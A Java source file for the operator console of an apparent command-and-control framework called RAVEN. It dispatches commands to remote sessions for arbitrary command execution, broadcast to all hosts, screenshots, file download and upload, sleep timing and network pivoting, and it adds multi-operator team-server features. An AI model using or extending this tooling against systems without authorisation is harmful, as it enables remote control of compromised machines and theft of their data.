package com.raven.interfaces.CLI;

import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.interfaces.CLI.module.chat.ChatManager;
import com.raven.interfaces.CLI.module.log.LogManager;
import com.raven.interfaces.CLI.module.operator.OperatorCommands;
import com.raven.interfaces.CLI.module.server.ServerManager;
import com.raven.interfaces.CLI.module.session.SessionCommands;
import com.raven.interfaces.CLI.module.task.TaskCommands;
import com.raven.interfaces.CLI.module.terminal.TerminalRenderer;
import com.raven.interfaces.CLI.module.terminal.TerminalWidthDetector;
import com.raven.interfaces.CLI.module.web.WebPanelManager;
import com.raven.utils.AnsiColor;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class CLI {

    private final ServerConfig      Config;
    private final TeamDatabase      Database;

    private final TerminalWidthDetector WidthDetector;
    private final TerminalRenderer      Renderer;
    private final LogManager            LogManager;
    private final ServerManager         ServerManager;
    private final SessionCommands       SessionCommands;
    private final OperatorCommands      OperatorCommands;
    private final ChatManager           ChatManager;
    private final WebPanelManager       WebPanelManager;
    private final TaskCommands          TaskCommands;

    private volatile boolean  Running          = true;
    private ListenerMode      ActiveMode       = ListenerMode.MULTI;
    private boolean           IsTeamServerMode = false;

    public CLI(ServerConfig Config) {
        this.Config   = Config;
        this.Database = TeamDatabase.Connect(Config);

        WidthDetector   = new TerminalWidthDetector();
        Renderer        = new TerminalRenderer(WidthDetector);
        LogManager      = new LogManager(Config.GetMaxLogEntries(), Renderer);
        ServerManager   = new ServerManager(Config, LogManager, Renderer);
        SessionCommands = new SessionCommands(Renderer, LogManager, Database);
        OperatorCommands= new OperatorCommands(Database, Renderer);
        ChatManager     = new ChatManager(Database, Renderer);
        WebPanelManager = new WebPanelManager(Config);
        TaskCommands    = new TaskCommands(Database, Renderer, SessionCommands);
    }

    private void SyncModules() {
        String OperatorName = OperatorCommands.GetOperatorName();
        SessionCommands.SetServer(ServerManager.GetServer());
        SessionCommands.SetOperator(OperatorName);
        ChatManager.SetOperator(OperatorName);
        TaskCommands.SetOperator(OperatorName);
        ServerManager.SetContext(IsTeamServerMode, OperatorName, ActiveMode);
        OperatorCommands.SetTeamServerMode(IsTeamServerMode);
        WebPanelManager.SetActiveMode(ActiveMode);
    }

    private void RunLoop() {
        SyncModules();

        BufferedReader Reader  = new BufferedReader(new InputStreamReader(System.in));
        int            LastCount = LogManager.Count();

        while (Running) {
            try {
                int CurrentCount = LogManager.Count();
                if (CurrentCount > LastCount) {
                    Logger.Info(CurrentCount - LastCount + " new event(s) - type 'logs' to view");
                    LastCount = CurrentCount;
                }

                Logger.Custom("  %n%s┌──{%sRAVEN@C2%s}%n%s└─%s>>%s ",
                    AnsiColor.Red, AnsiColor.White, AnsiColor.Red,
                    AnsiColor.Red, AnsiColor.White, AnsiColor.Reset);

                String Input = Reader.readLine();
                if (Input == null || Input.trim().isEmpty()) continue;

                String[] Parts = Input.trim().split("\\s+", 3);
                String   Command = Parts[0].toLowerCase();

                switch (Command) {
                    case "exit", "quit" -> {
                        Logger.Debug("shutting down server");
                        Running = false;
                        ServerManager.Stop();
                        if (WebPanelManager.IsRunning()) WebPanelManager.Stop();
                        Database.Close();
                        Logger.Shutdown();
                    }
                    case "help"                -> OperatorCommands.ShowHelp();
                    case "clear"               -> { SystemHelper.ClearScreen(); LastCount = LogManager.Count(); }
                    case "sessions", "agents"  -> SessionCommands.ShowSessions();
                    case "status"              -> ServerManager.ShowStatus(
                                                      Database.IsConnected() ? "connected" : "memory",
                                                      Config.GetDatabaseType());
                    case "stats"               -> SessionCommands.ShowStats();
                    case "logs"                -> { LogManager.Show(); LastCount = LogManager.Count(); }
                    case "use" -> {
                        if (Parts.length < 2) { Logger.Info("usage: use <id>"); continue; }
                        try { SessionCommands.Interactive(Integer.parseInt(Parts[1])); LastCount = LogManager.Count(); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "exec" -> {
                        if (!OperatorCommands.CanExecute()) { Logger.Warn("insufficient permissions"); continue; }
                        if (Parts.length < 3) { Logger.Info("usage: exec <id> <command>"); continue; }
                        try { SessionCommands.Execute(Integer.parseInt(Parts[1]), Parts[2]); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "broadcast" -> {
                        if (!OperatorCommands.CanExecute()) { Logger.Warn("insufficient permissions"); continue; }
                        if (Parts.length < 3) { Logger.Info("usage: broadcast <id,id,...|all> <command>"); continue; }
                        String Target  = Parts[1].toLowerCase();
                        String BroadcastCommand = Parts[2];
                        if (Target.equals("all")) {
                            SessionCommands.BroadcastAll(BroadcastCommand);
                        } else {
                            List<Integer> Ids = new ArrayList<>();
                            for (String IdString : Target.split(","))
                                try { Ids.add(Integer.parseInt(IdString.trim())); } catch (Exception Ignored) {}
                            if (Ids.isEmpty()) Logger.Info("No valid session IDs");
                            else SessionCommands.Broadcast(Ids, BroadcastCommand);
                        }
                    }
                    case "kill" -> {
                        if (Parts.length < 2) { Logger.Info("usage: kill <id>"); continue; }
                        try { SessionCommands.Kill(Integer.parseInt(Parts[1])); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "sysinfo", "info" -> {
                        if (Parts.length < 2) { Logger.Info("usage: sysinfo <id>"); continue; }
                        try { SessionCommands.ShowSessionInfo(Integer.parseInt(Parts[1])); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "whoami" -> {
                        if (SessionCommands.GetCurrentSessionId() > 0) {
                            SessionCommands.Execute(SessionCommands.GetCurrentSessionId(), "whoami");
                        } else if (Parts.length > 1) {
                            try { SessionCommands.Execute(Integer.parseInt(Parts[1]), "whoami"); }
                            catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                        } else Logger.Info("usage: whoami <session-id>");
                    }
                    case "tasks" -> SessionCommands.ShowTasksQueue();
                    case "screenshot" -> {
                        if (Parts.length < 2) { Logger.Info("usage: screenshot <session-id>"); continue; }
                        try { TaskCommands.Screenshot(Integer.parseInt(Parts[1])); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "download" -> {
                        if (Parts.length < 3) { Logger.Info("usage: download <session-id> <remote-path>"); continue; }
                        try { TaskCommands.Download(Integer.parseInt(Parts[1]), Parts[2]); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "upload" -> {
                        if (Parts.length < 3) { Logger.Info("usage: upload <session-id> <local-path> <remote-path>"); continue; }
                        try {
                            String[] UploadParts = Parts[2].split("\\s+", 2);
                            String LocalPath  = UploadParts[0];
                            String RemotePath = UploadParts.length > 1 ? UploadParts[1] : "";
                            TaskCommands.Upload(Integer.parseInt(Parts[1]), LocalPath, RemotePath);
                        } catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "sleep" -> {
                        if (Parts.length < 3) { Logger.Info("usage: sleep <session-id> <seconds>"); continue; }
                        try { TaskCommands.Sleep(Integer.parseInt(Parts[1]), Parts[2]); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "pivot" -> {
                        if (Parts.length < 3) { Logger.Info("usage: pivot <session-id> <host:port>"); continue; }
                        try { TaskCommands.RegisterPivot(Integer.parseInt(Parts[1]), Parts[2]); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "history" -> {
                        int SessionId = Parts.length > 1 ? TaskCommands.ParseIntSafe(Parts[1], 0) : 0;
                        int Limit     = Parts.length > 2 ? TaskCommands.ParseIntSafe(Parts[2], 50) : 50;
                        TaskCommands.ShowCommandHistory(SessionId, Limit);
                    }
                    case "note" -> {
                        if (Parts.length < 3) { Logger.Info("usage: note <session-id> <text>"); continue; }
                        try { TaskCommands.SetNote(Integer.parseInt(Parts[1]), Parts[2]); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "getnote" -> {
                        if (Parts.length < 2) { Logger.Info("usage: getnote <session-id>"); continue; }
                        try { TaskCommands.GetNote(Integer.parseInt(Parts[1])); }
                        catch (NumberFormatException Exception) { Logger.Warn("invalid session ID"); }
                    }
                    case "listopt", "listoperators" -> OperatorCommands.ShowOperators();
                    case "addopt", "addoperator" -> {
                        if (Parts.length < 3) { Logger.Info("usage: addopt <user> <pass> [SUPER|ADMIN|OPERATOR|MEMBER]"); continue; }
                        String[] Tokens   = Parts[2].split("\\s+", 2);
                        String   Password = Tokens[0];
                        String   RoleName = Tokens.length > 1 ? Tokens[1] : "OPERATOR";
                        OperatorCommands.AddOperator(Parts[1], Password, RoleName, Config.GetAdminUsername());
                    }
                    case "delopt", "deleteoperator" -> {
                        if (Parts.length < 2) { Logger.Info("usage: delopt <username>"); continue; }
                        OperatorCommands.DeleteOperator(Parts[1], Config.GetAdminUsername());
                    }
                    case "kick", "kickopt" -> {
                        if (Parts.length < 2) { Logger.Info("usage: kick <username>"); continue; }
                        OperatorCommands.KickOperator(Parts[1], Config.GetAdminUsername());
                    }
                    case "setrole", "changerole" -> {
                        if (Parts.length < 3) { Logger.Info("usage: setrole <user> <SUPER|ADMIN|OPERATOR|MEMBER>"); continue; }
                        OperatorCommands.SetRole(Parts[1], Parts[2], Config.GetAdminUsername());
                    }
                    case "passwd", "changepassword" -> {
                        if (Parts.length < 3) { Logger.Info("usage: passwd <user> <newpass>"); continue; }
                        OperatorCommands.ChangePassword(Parts[1], Parts[2]);
                    }
                    case "chat"                     -> ChatManager.ShowLocalMessages();
                    case "chathistory", "chatlog"   -> ChatManager.ShowDatabaseHistory();
                    case "ch" -> {
                        if (!IsTeamServerMode) { Logger.Warn("not in team mode"); continue; }
                        if (Parts.length < 3) { Logger.Info("usage: ch <recipient> <message>"); continue; }
                        ChatManager.Send(Parts[1], Parts[2]);
                    }
                    case "gc" -> {
                        if (!IsTeamServerMode) { Logger.Warn("not in team mode"); continue; }
                        if (Parts.length < 3) { Logger.Info("usage: gc <all|name1,name2,...> <message>"); continue; }
                        String Target  = Parts[1].toLowerCase();
                        String Message = Parts[2];
                        if (Target.equals("all")) {
                            ChatManager.Send("all", Message);
                        } else {
                            for (String Name : Target.split(",")) {
                                String Trimmed = Name.trim();
                                if (!Trimmed.isEmpty()) ChatManager.Send(Trimmed, Message);
                            }
                        }
                    }
                    case "webstart" -> {
                        String WebHost = Parts.length > 1 ? Parts[1] : Config.GetWebHost();
                        int    WebPort = Parts.length > 2 ? TaskCommands.ParseIntSafe(Parts[2], Config.GetWebPort()) : Config.GetWebPort();
                        WebPanelManager.Start(WebHost, WebPort, ServerManager.GetServer(), ServerManager.GetServerStartTime());
                    }
                    case "webstop"   -> WebPanelManager.Stop();
                    case "webstatus" -> WebPanelManager.ShowStatus();
                    default -> {
                        Logger.Error("Unknown command: " + Command);
                        Logger.Info("Type 'help' for available commands");
                    }
                }
            } catch (IOException Exception) {
                break;
            }
        }
    }

    public void Run(String Host, int Port, ListenerMode Mode) {
        ActiveMode       = Mode;
        IsTeamServerMode = false;
        SyncModules();
        if (!ServerManager.Start(Host, Port, Mode)) return;
        try { Thread.sleep(300); } catch (InterruptedException Ignored) {}
        RunLoop();
        System.exit(0);
    }

    public void RunTeamServer(String Host, int Port, ListenerMode Mode) throws IOException {
        ActiveMode       = Mode;
        IsTeamServerMode = true;
        SyncModules();

        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        if (!OperatorCommands.Login(Reader)) return;

        SyncModules();
        Logger.Custom("  %n%sStarting listener on %s:%d%s%n%n",
            AnsiColor.Green, Host, Port, AnsiColor.Reset);
        if (!ServerManager.Start(Host, Port, Mode)) return;
        try { Thread.sleep(300); } catch (InterruptedException Ignored) {}
        RunLoop();
        System.exit(0);
    }
}
